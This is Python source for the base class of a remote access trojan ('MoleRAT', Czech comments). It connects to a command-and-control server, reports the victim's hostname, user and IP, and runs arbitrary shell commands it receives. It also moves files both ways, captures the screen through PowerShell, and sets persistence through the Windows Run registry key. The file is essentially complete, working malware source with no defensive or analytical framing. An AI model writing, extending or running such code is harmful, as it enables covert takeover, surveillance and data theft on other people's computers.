# rat/base.py
import base64
import json
import logging
import os
import platform
import socket
import struct
import subprocess
import sys
import tempfile
import time


class RemoteAccessTool:
    """
    Zakladni trida pro RAT. Resi spojeni, framing, shell, file transfer.
    Konkretni prikazy resi potomek (MeterpreterRAT).
    """

    def __init__(self, config):
        self.config = config
        self.sock = None
        self.running = False

    # ---------- spojeni ----------

    def connect_to_c2(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(30)
            self.sock.connect((self.config["c2_host"], self.config["c2_port"]))
        except OSError as e:
            logging.error(f"C2 connect failed: {e}")
            self.sock = None
            return False

        self.send_json(self._handshake())
        logging.info(f"Connected to C2 {self.config['c2_host']}:{self.config['c2_port']}")
        return True

    def _handshake(self):
        try:
            user = os.getlogin()
        except OSError:
            user = os.environ.get("USERNAME") or os.environ.get("USER", "?")
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "user": user,
            "ip": socket.gethostbyname(socket.gethostname()),
        }

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    # ---------- framing ----------

    def send_json(self, data):
        raw = json.dumps(data).encode("utf-8")
        self.sock.sendall(struct.pack("!I", len(raw)) + raw)

    def receive_json(self):
        """Vrati dict, nebo None pri EOF. Pri chybe vyhodi vyjimku."""
        header = self._recv_exact(4)
        if header is None:
            return None
        (length,) = struct.unpack("!I", header)
        body = self._recv_exact(length)
        if body is None:
            return None
        return json.loads(body.decode("utf-8"))

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf

    # ---------- shell ----------

    def execute_shell(self, command, timeout=30):
        try:
            r = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return {"stdout": r.stdout, "stderr": r.stderr, "returncode": r.returncode}
        except subprocess.TimeoutExpired:
            return {"error": f"timeout ({timeout}s)"}

    # ---------- file transfer ----------

    def download_file(self, rpath):
        try:
            with open(rpath, "rb") as f:
                content = f.read()
        except OSError as e:
            return {"error": str(e)}
        return {
            "filename": os.path.basename(rpath),
            "content": base64.b64encode(content).decode("ascii"),
            "size": len(content),
        }

    def upload_file(self, rpath, b64content):
        try:
            data = base64.b64decode(b64content)
            parent = os.path.dirname(rpath)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(rpath, "wb") as f:
                f.write(data)
        except (OSError, ValueError) as e:
            return {"error": str(e)}
        return {"status": f"uploaded: {rpath}"}

    # ---------- screenshot ----------

    def take_screenshot(self):
        if platform.system() != "Windows":
            return {"error": "screenshot zatim jen Windows"}

        tmpdir = tempfile.mkdtemp(prefix="shot_")
        out = os.path.join(tmpdir, "screen.png")
        img = b""  # <-- FIX: inicializace pred try

        ps = (
            "Add-Type -AssemblyName System.Windows.Forms;"
            "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
            "$g=[System.Drawing.Graphics]::FromImage($b);"
            "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
            f'$b.Save("{out}");'
            "$g.Dispose();$b.Dispose();"
        )
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps],
                capture_output=True, timeout=20,
            )
            with open(out, "rb") as f:
                img = f.read()
        except (OSError, subprocess.TimeoutExpired) as e:
            return {"error": str(e)}
        finally:
            try:
                os.remove(out)
                os.rmdir(tmpdir)
            except OSError:
                pass

        if not img:
            return {"error": "screenshot selhal (prazdny vystup)"}
        return {
            "screenshot": base64.b64encode(img).decode("ascii"),
            "resolution": "primary screen",
        }

    # ---------- system info ----------

    def get_system_info(self):
        try:
            user = os.getlogin()
        except OSError:
            user = os.environ.get("USERNAME") or os.environ.get("USER", "?")
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "username": user,
            "ip": socket.gethostbyname(socket.gethostname()),
            "cwd": os.getcwd(),
        }

    # ---------- persistence ----------

    def set_persistence(self, enable):
        if platform.system() != "Windows":
            return {"error": "persistence jen Windows"}

        script = os.path.abspath(sys.argv[0])
        key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            if enable:
                subprocess.run(
                    ["reg", "add", key, "/v", "MoleRAT", "/t", "REG_SZ",
                     "/d", script, "/f"],
                    capture_output=True, check=True,
                )
                return {"status": "added to startup"}
            subprocess.run(
                ["reg", "delete", key, "/v", "MoleRAT", "/f"],
                capture_output=True, check=True,
            )
            return {"status": "removed from startup"}
        except subprocess.CalledProcessError as e:
            return {"error": f"reg failed: {e}"}

    # ---------- hlavni smycka ----------

    def run(self):
        self.running = True

        while self.running:
            if not self.sock:
                if not self.connect_to_c2():
                    time.sleep(self.config["reconnect_interval"])
                    continue

            try:
                self.sock.settimeout(1.0)
                cmd = self.receive_json()
            except socket.timeout:
                continue
            except (OSError, json.JSONDecodeError) as e:
                logging.error(f"recv error: {e}")
                self.close()
                continue

            if cmd is None:
                self.close()
                continue

            try:
                resp = self.execute_command(cmd)
            except Exception as e:
                logging.exception("command failed")
                resp = {"error": str(e)}

            try:
                self.send_json(resp)
            except OSError as e:
                logging.error(f"send error: {e}")
                self.close()

            if cmd.get("type") == "kill":
                self.running = False

        self.close()

    def execute_command(self, cmd):
        raise NotImplementedError("pouzij MeterpreterRAT")